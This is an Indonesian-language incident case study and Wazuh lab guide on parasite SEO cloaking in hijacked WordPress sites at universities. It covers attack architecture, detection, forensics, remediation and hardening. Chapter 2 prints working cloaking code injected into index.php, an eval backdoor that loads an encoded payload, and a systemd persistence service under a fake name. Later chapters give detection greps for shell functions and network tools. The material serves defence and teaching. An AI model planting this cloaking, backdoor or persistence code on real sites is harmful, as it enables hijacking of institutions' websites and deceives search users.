# Studi Kasus: SEO Cloaking Parasite pada Shared Hosting WordPress

---

## Chapter 1 — Latar Belakang

### 1.1 Fenomena Parasite SEO di Indonesia

_parasite SEO_ adalah teknik black-hat di mana pelaku kejahatan siber memanfaatkan otoritas domain bereputasi tinggi (`.go.id`, `.ac.id`, `.sch.id`) untuk menampilkan konten ilegal — seperti **judi online (judol)** — di hasil pencarian Google. Domain-domain ini memiliki **Domain Authority (DA) tinggi** secara organik, sehingga Google memberi peringkat lebih baik pada URL di bawahnya.

Sepanjang 2021–2026, ribuan situs pemerintah dan pendidikan di Indonesia menjadi korban:

- **2021**: CISSReC mencatat puluhan situs `.go.id` dan `.ac.id` disusupi konten judi, termasuk `dim.telkomuniversity.ac.id`, `dlhk.jatengprov.go.id`, `ntb.polri.go.id`
- **2023–2024**: Polres Metro Jakarta Barat menangkap 7 peretas yang menyewakan 855+ situs (500 `.go.id` + 355 `.ac.id`) ke jaringan judi Kamboja — Rp170 miliar dalam 3 bulan
- **2025**: iGracias, LAAK FEB, S3 IF Telkom University diretas — promosi `kentang.bet`
- **2026**: `dsm.telkomuniversity.ac.id` terdeteksi Parasite SEO via cloaking pada halaman `/data-alumni/`

### 1.2 Mengapa Domain Universitas?

```
┌─────────────────────────────────────────────────────────┐
│  Alasan domain .ac.id menjadi target utama:             │
│                                                         │
│  1. DA/DR tinggi → Google memberi trust score tinggi    │
│  2. Pengelolaan keamanan sering lemah (plugin usang,    │
│     tidak ada security plugin, jarang di-audit)          │
│  3. Shared hosting → 1 kompromi = 5+ domain terdampak   │
│  4. Subdomain jarang dipantau → months-to-exploit       │
│  5. Blokir Kominfo tidak menjangkau subdomain .ac.id    │
└─────────────────────────────────────────────────────────┘
```

### 1.3 Dampak

| Area | Dampak |
|------|--------|
| **Hukum** | Pemilik situs bisa terseret UU ITE (domain dipakai judi ilegal) |
| **Reputasi** | Nama institusi tercoreng di hasil pencarian Google |
| **SEO** | Situs bisa kena Google manual action → hilang dari indeks |
| **Data** | Backdoor bisa dimanfaatkan untuk data breach |
| **Traffic** | Bandwidth habis untuk konten ilegal yang di-crawl |

---

## Chapter 2 — Technical Analysis

### 2.1 Arsitektur Serangan

```
                          ┌──────────────────┐
                          │   Attacker        │
                          │   (C2 Server)     │
                          └──────┬───────────┘
                                 │
                1. Exploit vuln  │
                2. Upload shell  │
                3. Deploy cloak  │
                                 ▼
                    ┌─────────────────────┐
                    │  Shared Hosting      │
                    │  (CyberPanel/aaPanel)│
                    │                     │
                    │  public_html/       │
                    │  ├── index.php      │← MODIFIED (cloak engine)
                    │  ├── indexx.php     │← backup original
                    │  ├── security.php   │← konten judi
                    │  ├── wp-config.php  │← backdoor eval
                    │  └── wp-content/    │
                    └────────┬────────────┘
                             │
              ┌──────────────┴──────────────┐
              │                              │
              ▼                              ▼
    ┌─────────────────┐          ┌──────────────────┐
    │  Googlebot       │          │  User biasa       │
    │  (crawl)         │          │  (Chrome/Safari)  │
    │                  │          │                   │
    │  index.php       │          │  index.php        │
    │  → deteksi UA    │          │  → tidak cocok    │
    │  → include       │          │  → include        │
    │    security.php  │          │    wp-blog-header  │
    │  → konten judi!  │          │  → situs normal!  │
    └─────────────────┘          └──────────────────┘
```

### 2.2 Cloaking Mechanism (PHP-based)

Vektor serangan **bukan** melalui `.htaccess` melainkan **modifikasi langsung `index.php`** — file inti WordPress. Ini lebih siluman karena:

- `.htaccess` tidak berubah → rule FIM `.htaccess` (100022) tidak trigger
- `index.php` jarang dimonitor (dianggap statis setelah instalasi)
- Backdoor tersembunyi di `wp-config.php` — file yang sering diabaikan

#### File `index.php` (Setelah Kompromi)

```php
<?php
/**
 * Front to the WordPress application. This file doesn't do anything,
 * but loads wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * SEO Cloaking — Googlebot redirect to security.php
 */
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (preg_match('/googlebot|google|bing|yahoo|yandex|baidu|facebookexternalhit|twitterbot/i', $user_agent)) {
    $cloak_page = __DIR__ . '/security.php';
    if (file_exists($cloak_page)) {
        include $cloak_page;
        exit;
    }
}

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
```

#### Variasi Cloaking Lain yang Ditemukan

```php
// Variasi 1 — Check via $_SERVER langsung
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) {
    include('security.php');
    exit;
}

// Variasi 2 — Regex multiple bot
if(preg_match('/bot|crawl|spider|scrape|google|bing|yahoo|facebook|twitter/i', $_SERVER['HTTP_USER_AGENT'])) {
    header('Location: /security.php');
    exit;
}

// Variasi 3 — Function-based (tersembunyi di functions.php)
function seo_cloak_check() {
    $bots = ['googlebot', 'bingbot', 'slurp', 'yandex'];
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    foreach($bots as $bot) {
        if(strpos($ua, $bot) !== false) {
            include_once WP_CONTENT_DIR . '/security.php';
            exit;
        }
    }
}
add_action('init', 'seo_cloak_check', 0);

// Variasi 4 — wp-config.php backdoor
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/googlebot/i', $ua)) {
    $f = fopen(dirname(__FILE__).'/wp-content/uploads/.cache', 'r');
    if ($f) { eval(fread($f, filesize(dirname(__FILE__).'/wp-content/uploads/.cache'))); fclose($f); }
}
// Combined with .htaccess cloaking:
```

### 2.3 Persistence Mechanism

Dari insiden nyata, penyerang menggunakan **systemd service** untuk auto-restore:

```bash
# /etc/systemd/system/jj.service
[Unit]
Description=Cache Optimization Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do
    if [ ! -f /var/www/public_html/security.php ]; then
        cp /opt/backup/security.php /var/www/public_html/security.php
        chmod 644 /var/www/public_html/security.php
        # Re-inject cloak code into index.php
        sed -i "s/require.*wp-blog-header/\/* cloak *\/ include 'security.php'; \/\/ \n&/" /var/www/public_html/index.php
    fi
    sleep 300
done'
Restart=always
User=www-data

[Install]
WantedBy=multi-user.target
```

Service lain yang ditemukan: `ii.service`, `cahce-l.service`, `cache-optimizer.service` (nama samaran).

### 2.4 External Resource Abuse

Konten gambling di `security.php` biasanya menggunakan asset eksternal:

```html
<!-- Gambling images hosted on anonymous CDN -->
<img src="https://assetsbanner.sgp1.cdn.digitaloceanspaces.com/haram/flyfree-logo.png">
<img src="https://assetsbanner.sgp1.cdn.digitaloceanspaces.com/haram/slot-banner.jpg">

<!-- External JavaScript for tracking -->
<script src="https://cincinnatisirens.com/cdn/s/trekkie.storefront.xxx.min.js"></script>

<!-- Cloudflare beacon for analytics -->
<script src="https://static.cloudflareinsights.com/beacon.min.js/xxx"></script>
```

Pola CDN: `*.cdn.digitaloceanspaces.com` — DigitalOcean Spaces murah dan tanpa moderasi konten, banyak digunakan untuk hosting asset ilegal. Lihat: [Menemukan Akun DigitalOcean Spaces untuk Hosting Asset Judi Online](https://www.antaranews.com/berita/4420786/kominfo-temukan-akun-digitalocean-spaces-untuk-hosting-aset-situs-judi-online)

### 2.5 File Anomali — Pattern

| File | Fungsi | Deteksi |
|------|--------|---------|
| `index.php` | Cloak engine — deteksi UA bot → include `security.php` | FIM rule 553 (modified) |
| `indexx.php` | Backup `index.php` original (kadang backdoor) | FIM rule 550 (new file) |
| `security.php` | Konten gambling full HTML | FIM rule 550 (new file) |
| `wp-config.php` | Kadang disisipi eval backdoor | FIM rule 553 + signature |
| `.cache` (di uploads) | Encoded PHP payload, di-include via `wp-config.php` | FIM rule 550 (hidden file) |

---

## Chapter 3 — Detection Methodology

### 3.1 Googlebot User-Agent Test (Primary)

Cara paling sederhana untuk mendeteksi SEO cloaking:

```bash
# Test sebagai user biasa — seharusnya tampil situs normal
curl -s -I "https://target.ac.id/data-alumni/" | head -20

# Test sebagai Googlebot — jika cloaking aktif, akan tampil konten berbeda
curl -s -I -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
  "https://target.ac.id/data-alumni/" | head -20
```

**Indikator Cloaking:**
- Title tag berbeda antara normal vs Googlebot
- HTTP status berbeda (200 normal → 301 redirect untuk Googlebot)
- Response time berbeda signifikan
- Content length berbeda drastis

### 3.2 Google Search Console (GSC)

Di GSC, indikator kompromi:

- **Search results — index coverage**: URL yang terindeks dengan title/description tidak dikenal
- **Manual actions**: Notifikasi dari Google tentang unnatural links atau cloaking
- **URL Inspection Tool**: "Discovered — currently not indexed" dalam jumlah besar (halaman judi)

### 3.3 Google Dorking

```bash
# Cari halaman judi di domain target
site:telkomuniversity.ac.id "deface" OR "cloaking" OR "seo" OR "security.php"

# Cari path mencurigakan
site:telkomuniversity.ac.id inurl:security.php
site:telkomuniversity.ac.id inurl:indexx.php

# Cek page title di indeks
intitle:"deface seo cloaking" site:telkomuniversity.ac.id
intitle:"deface" site:ac.id
```

### 3.4 Server Log Analysis

Apache access log pattern:

```apache
# Normal user — akses index.php biasa
192.168.1.1 - - [26/Jun/2026:10:00:00 +0700] "GET / HTTP/1.1" 200 5000 "-" "Mozilla/5.0 Chrome/120"

# Googlebot — kena cloak engine, dapat security.php
66.249.66.1 - - [26/Jun/2026:10:00:01 +0700] "GET / HTTP/1.1" 200 15000 "-" "Mozilla/5.0 Googlebot/2.1"

# Attacker — akses backdoor
10.0.0.100 - - [26/Jun/2026:09:55:00 +0700] "POST /shell.php HTTP/1.1" 200 50 "curl/7.88.1"
```

Indikator di log:
- **Googlebot** ke URL yang tidak umum (bukan URL canonical)
- Response size berbeda untuk Googlebot vs user biasa
- Crawl rate abnormal dari Googlebot IP

### 3.5 Wazuh SIEM Detection

Lihat Chapter 7 untuk detail rules dan query.

### 3.6 File Integrity Check

```bash
# Bandingkan checksum index.php dengan salinan dari WordPress original
md5sum /var/www/public_html/index.php
grep -n 'googlebot\|preg_match.*UA\|include.*security' /var/www/public_html/index.php

# Cari file anomali
find /var/www -name "security.php" -o -name "indexx.php" -o -name "index.php.bak"
find /var/www -name "*.php" -newer /var/www/wp-config.php -type f 2>/dev/null
```

---

## Chapter 4 — Forensic Artifacts

### 4.1 File System Artifacts

```bash
# 1. Daftar file yang berubah dalam 7 hari terakhir
find /home/domain -name "*.php" -mtime -7 -type f | sort

# 2. Cari file dengan pola cloaking
grep -rl 'preg_match.*user_agent\|strpos.*googlebot\|include.*security' \
  /home/domain*/public_html/ --include="*.php"

# 3. Cari file dengan permission tidak wajar
find /home/domain -perm /o+w -name "*.php" -type f 2>/dev/null

# 4. Cari file dengan owner berbeda
find /home/domain -not -user www-data -not -user root -name "*.php" 2>/dev/null
```

### 4.2 .htaccess Artifacts

Meskipun pattern kasus ini tidak menggunakan `.htaccess`, dalam beberapa varian:

```apache
# Cloaking via .htaccess
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} googlebot|bing|slurp [NC]
RewriteRule ^(.*)$ /security.php [L,R=301]

# atau redirect kondisional via Referer
RewriteCond %{HTTP_REFERER} google\. [NC]
RewriteRule ^(.*)$ https://judionline.xyz/ [L,R=302]
```

### 4.3 Database Artifacts

```
wp_options table:
  ┌──────────────────────────────┬──────────────────────────────────┐
  │ option_name                   │ option_value                   │
  ├──────────────────────────────┼──────────────────────────────────┤
  │ siteurl                       │ https://target.ac.id           │
  │ home                          │ https://target.ac.id           │
  │ widget_cloak_settings        │ a:2:{s:7:"enabled";s:1:"1";...} │ ← SUSPICIOUS
  │ cloak_page                   │ /security.php                   │ ← SUSPICIOUS
  └──────────────────────────────┴──────────────────────────────────┘

wp_posts table:
  - Post dengan status 'publish' berisi keyword mencurigakan (deface, cloaking, redirect)
  - Post dengan status 'trash' atau 'draft' dalam jumlah besar
  - Post dengan GUID mencurigakan
```

### 4.4 Network Artifacts

```bash
# Cek koneksi keluar mencurigakan
lsof -i -n -P | grep -E 'ESTABLISHED|CLOSE_WAIT' | grep -v '127.0.0.1'

# Cek listening ports tidak dikenal
ss -tlnp | grep -v ':80\|:443\|:22'

# Cek DNS query mencurigakan
tcpdump -i any -n port 53 2>/dev/null | grep -v 'google\|cloudflare\|opendns'
```

### 4.5 System Artifacts

```bash
# Cari service/systemd mencurigakan
systemctl list-units --type=service --all | grep -E '\.service'
ls -la /etc/systemd/system/*.service | grep -v 'apache\|mariadb\|ssh'

# Cari cron job mencurigakan
crontab -l 2>/dev/null
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Cari process berbahaya
ps aux | grep -v '\[.*\]' | grep -i 'bash\|curl\|wget\|nc\|perl\|python'
```

---

## Chapter 5 — Remediation

### 5.1 Immediate Isolation (30 menit)

```bash
# 1. Ambil server offline atau ganti DNS
# 2. Block hosting panel port (CyberPanel: 8090, aaPanel: 8888)
ufw deny 8090/tcp
ufw deny 8888/tcp

# 3. Ganti semua password:
#    - WordPress admin user
#    - Database user
#    - FTP/SFTP user
#    - Hosting panel (CyberPanel/aaPanel)
#    - Server root/SSH

# 4. Nonaktifkan semua plugin + ganti theme ke default
wp plugin deactivate --all --allow-root
wp theme activate twentytwentyfour --allow-root
```

### 5.2 File System Cleanup (1-2 jam)

```bash
# 1. Reindex checksum semua file
find /home/domain -name "*.php" -exec md5sum {} \; > /tmp/checksums.before

# 2. Hapus file anomali
rm -f /home/domain*/public_html/security.php
rm -f /home/domain*/public_html/indexx.php
rm -f /home/domain*/public_html/wp-content/uploads/shell.php
rm -f /home/domain*/public_html/wp-content/uploads/.cache

# 3. Restore index.php dari WordPress original
for i in 1 2 3 4 5; do
  wp core download --skip-content --force --allow-root \
    --path=/home/domain${i}.ac.id/public_html/
done

# 4. Hapus backdoor dari wp-config
# Cek apakah ada kode eval/tambahan di luar konfigurasi standar
grep -n 'eval\|base64_decode\|preg_replace.*e\|system\|exec\|shell_exec\|passthru\|include.*security' \
  /home/domain*/public_html/wp-config.php

# 5. Scan seluruh direktori untuk backdoor
grep -rn 'eval(\|base64_decode\|preg_replace.*e\|system(\|shell_exec\|exec(\|passthru(\|include.*security' \
  /home/domain*/public_html/ --include="*.php"
```

### 5.3 Database Cleanup (30 menit)

```bash
# 1. Cek wp_users — hapus user tidak dikenal
wp user list --allow-root
wp user delete <suspicious_user_id> --allow-root

# 2. Cek wp_options — cari option mencurigakan
wp option list --search="*cloak*" --allow-root
wp option list --search="*security*" --allow-root
wp option list --search="*redirect*" --allow-root

# 3. Cek wp_posts — hapus post judi
wp post list --post_type=any --allow-root --fields=ID,post_title,post_status
wp post delete <id> --force --allow-root

# 4. Reset secret keys
wp config shuffle-salts --allow-root
```

### 5.4 System Cleanup (30 menit)

```bash
# 1. Hentikan dan disable service mencurigakan
systemctl stop jj.service ii.service cahce-l.service 2>/dev/null
systemctl disable jj.service ii.service cahce-l.service 2>/dev/null
rm -f /etc/systemd/system/{jj,ii,cahce-l}.service

# 2. Hapus cron mencurigakan
crontab -r

# 3. Bersihkan session PHP yang mencurigakan
find /var/lib/php/sessions -type f -delete
```

### 5.5 Post-Remediation (2-4 jam)

```bash
# 1. Reinstall WordPress core
for i in 1 2 3 4 5; do
  wp core download --skip-content --force --allow-root \
    --path=/home/domain${i}.ac.id/public_html/
  wp core update-db --allow-root \
    --path=/home/domain${i}.ac.id/public_html/
done

# 2. Install security plugin
wp plugin install wordfence --activate --allow-root

# 3. Update semua plugin
wp plugin update --all --allow-root

# 4. Update theme
wp theme update --all --allow-root

# 5. Reset file permissions
find /home/domain -type d -exec chmod 755 {} \;
find /home/domain -type f -exec chmod 644 {} \;
chmod 440 /home/domain*/public_html/wp-config.php
chown -R www-data:www-data /home/domain*/public_html/wp-content/uploads

# 6. Aktifkan Wazuh FIM monitoring untuk index.php dan security.php
# (configure via manager group agent.conf)
```

### 5.6 Google Search Actions

```bash
# 1. Request URL removal via Google Search Console
#    → URL Removal Tool → temporary remove
#    URL: https://target.ac.id/data-alumni/

# 2. Report spam via Google Search Console
#    → Manual Actions → Request Review

# 3. Cek kembali setelah 7 hari
#    → URL Inspection → Test Live URL
#    → Pastikan Googlebot mendapat konten legitimate
```

---

## Chapter 6 — Hardening & Prevention

### 6.1 WordPress Security Baseline

| Item | Implementasi |
|------|-------------|
| **Core updates** | Auto-update minor, major via staging |
| **Plugin hygiene** | Hanya plugin dari repository resmi, audit tiap bulan |
| **Security plugin** | Wordfence / Sucuri / Defender Pro (WPMU Dev) |
| **Login protection** | Limit login attempts, 2FA, CAPTCHA |
| **File change monitoring** | Wazuh FIM real-time untuk file kritis |
| **Database prefix** | Bukan `wp_` (random prefix saat install) |
| **SSL/HTTPS** | Force HTTPS via `.htaccess` |
| **User audit** | Hapus user tidak aktif, enforce strong password |

### 6.2 Wazuh FIM — File Monitoring Kritis

Update grup config `wordpress-hosting`/`agent.conf`:

```xml
<directories check_all="yes" report_changes="yes" realtime="yes">
    /home/domain1.ac.id/public_html/index.php
    /home/domain1.ac.id/public_html/wp-config.php
    /home/domain2.ac.id/public_html/index.php
    /home/domain2.ac.id/public_html/wp-config.php
    /home/domain3.ac.id/public_html/index.php
    /home/domain3.ac.id/public_html/wp-config.php
    /home/domain4.ac.id/public_html/index.php
    /home/domain4.ac.id/public_html/wp-config.php
    /home/domain5.ac.id/public_html/index.php
    /home/domain5.ac.id/public_html/wp-config.php
</directories>

<!-- Scheduled scan for new PHP files (webshell detection) -->
<directories check_all="yes" realtime="no">
    /home/domain*.ac.id/public_html/wp-content/uploads
</directories>
```

### 6.3 Web Server Hardening (LiteSpeed / Apache)

```apache
# Block PHP execution in uploads
<Directory "/home/*/public_html/wp-content/uploads">
    php_admin_flag engine off
    <FilesMatch "\.php$">
        Require all denied
    </FilesMatch>
</Directory>

# Block wp-config.php access
<Files wp-config.php>
    Require all denied
</Files>

# Security headers
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "same-origin"
```

### 6.4 Hosting Panel Hardening

| Panel | Action |
|-------|--------|
| **CyberPanel** | Enable ModSecurity + OWASP CRS, enable Imunify360, disable shell exec for WordPress users, set open_basedir per domain |
| **aaPanel** | Enable Nginx firewall, enable ModSecurity, disable dangerous functions, set website isolation |

### 6.5 PHP Hardening

```ini
; php.ini — disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,
                    curl_exec,curl_multi_exec,parse_ini_file,show_source

; open_basedir — batasi akses ke direktori domain sendiri
open_basedir = /home/domain1.ac.id/:/tmp/

; Limit resource
max_execution_time = 30
max_input_time = 30
post_max_size = 8M
upload_max_filesize = 2M
allow_url_fopen = Off
allow_url_include = Off
```

### 6.6 Regular Monitoring & Auditing

| Frekuensi | Aktivitas |
|-----------|-----------|
| **Harian** | Cek Wazuh dashboard — FIM alerts, webshell detection |
| **Mingguan** | Scan Google Search Console — cek URL tidak dikenal |
| **Bulanan** | User audit, plugin/theme update, full vulnerability scan |
| **Per-Event** | Setiap perubahan file kritis → notifikasi real-time via Wazuh |

---

## Chapter 7 — Lab Simulation

### 7.1 Prasyarat

- Lab wazuh-belajar sudah running: `docker-compose ps`
- Injector terkoneksi ke shared-hosting container
- Agent 002 terdaftar dan terhubung ke Wazuh manager

### 7.2 Scenario: `seo-cloaking.sh`

File: `scripts/scenarios/seo-cloaking.sh`

Simulasi attack chain lengkap:

| Phase | Aksi | Evidence di Wazuh |
|-------|------|--------------------|
| 1 — Recon | WPScan simulation | Apache access log alerts |
| 2 — Shell | Upload webshell | FIM rule 100020 (new .php) |
| 3 — Cloak | Modify index.php | FIM rule 100030 (index.php mod) |
| 4 — Content | Create security.php | FIM rule 100031 (security.php) |
| 5 — Crawl | Googlebot simulation | Apache log — Googlebot UA |
| 6 — Persist | Install service | (simulate syslog) |

### 7.3 Aktivasi Scenario

```bash
# 1. Tambahkan ke orchestrator.conf
# ENABLED_SCENARIOS="... seo-cloaking"

# 2. Atau jalankan langsung dari container
docker exec injector bash /scripts/scenarios/seo-cloaking.sh

# 3. Cek alert di Wazuh
# Discover → wazuh-alerts-*
# Filter: rule.id : 100030 OR rule.id : 100031 OR rule.id : 100032
```

### 7.4 Detection Queries di Wazuh Dashboard

**KQL — Deteksi Modifikasi index.php:**
```
syscheck.path : "index.php" AND rule.id : "553"
```

**KQL — Deteksi File Security.php Baru:**
```
syscheck.path : "security.php" AND rule.id : "550"
```

**KQL — Googlebot Crawl ke Halaman Mencurigakan:**
```
data.ua : "*Googlebot*" AND (data.uri : "/data-alumni" OR data.uri : "/security")
```

**KQL — Forensik Timeline Multi-Source:**
```
(rule.id : "100030" OR rule.id : "100031" OR rule.id : "100032")
AND agent.name : "shared-hosting"
```

**Dev Tools — Full Attack Reconstruction:**
```
GET wazuh-alerts-*/_search
{
  "query": {
    "bool": {
      "should": [
        { "term": { "rule.id": "100030" } },
        { "term": { "rule.id": "100031" } },
        { "term": { "rule.id": "100032" } },
        { "term": { "rule.id": "100033" } }
      ]
    }
  },
  "_source": ["@timestamp", "rule.id", "rule.description", "syscheck.path", "data.ua"],
  "sort": [{ "@timestamp": "asc" }]
}
```

### 7.5 Verifikasi Cloaking di Lab

```bash
# Dari host (bukan dari container!)
# Test sebagai user biasa — seharusnya WordPress normal
curl -s http://localhost:7070/ | grep -o '<title>.*</title>'

# Test sebagai Googlebot — jika cloaking aktif, dapat konten judi
curl -s -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
  http://localhost:7070/ | grep -o '<title>.*</title>'
```

Jika title berbeda (`Akademi Ninja Konoha — Portal Ninja` vs `deface seo cloaking`), cloaking ✅

---

## Referensi

1. [Panduan Penanganan Insiden Web Defacement Judi Online — EduCSIRT Kemendikdasmen](https://educsirt.kemendikdasmen.go.id/assets/panduan/Panduan_Penanganan_Insiden_Web_Defacement_Judi_Online.pdf)
2. [Analisis Insiden Keamanan — Parasite SEO di bolif.telkomuniversity.ac.id](https://hilfan.staff.telkomuniversity.ac.id/analisis-insiden-keamanan-dan-perbaikan-website-yang-dialihkan-ke-website-lain-di-hasil-pencarian-google/)
3. [Website Telkom University Diduga Diretas — Aksara News](https://aksarapers.com/website-telkom-university-diduga-diretas-muncul-promosi-situs-judi-online/)
4. [Kenapa Hacker Incar Situs Pemerintah dan Universitas — Kompas Tekno](https://tekno.kompas.com/read/2023/01/19/07300037/kenapa-hacker-incar-situs-pemerintah-dan-universitas-untuk-promo-judi-online-)
5. [Ratusan Situs Pemerintah-Kampus Diretas Judi Online, 3 Bulan Dapat Rp170 M — NTV News](https://www.ntvnews.id/news/017354/ratusan-situs-pemerintah-kampus-diretas-judi-online-3-bulan-dapat-rp170-m)
6. [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
7. [WordPress Hardening — OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Wordpress_Security_Cheat_Sheet.html)
